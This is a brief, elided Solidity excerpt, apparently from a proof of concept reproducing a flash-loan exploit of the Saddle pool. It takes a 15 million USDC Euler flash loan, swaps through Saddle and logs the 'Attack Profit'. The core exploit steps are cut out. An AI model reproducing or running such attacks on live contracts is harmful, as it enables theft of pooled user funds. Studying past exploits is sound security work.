...
interface ISaddle {
    function swap(uint8 i, uint8 j, uint256 dx, uint256 min_dy, uint deadline) external returns(uint);
}

contract Saddle is Ownable {
    ...
    function start() public {
        IEuler(eulerLoans).flashLoan(address(this), usdc, 15000000e6, new bytes(0));
        console.log("Attack Profit: %s", IERC20(usdc).balanceOf(address(this)));
    }
    ...
    function swapToSaddle(uint amountStart) internal {
        ...
        console.log("saddleUsdV2: %s", IERC20(saddleUsdV2).balanceOf(address(this)));
    }
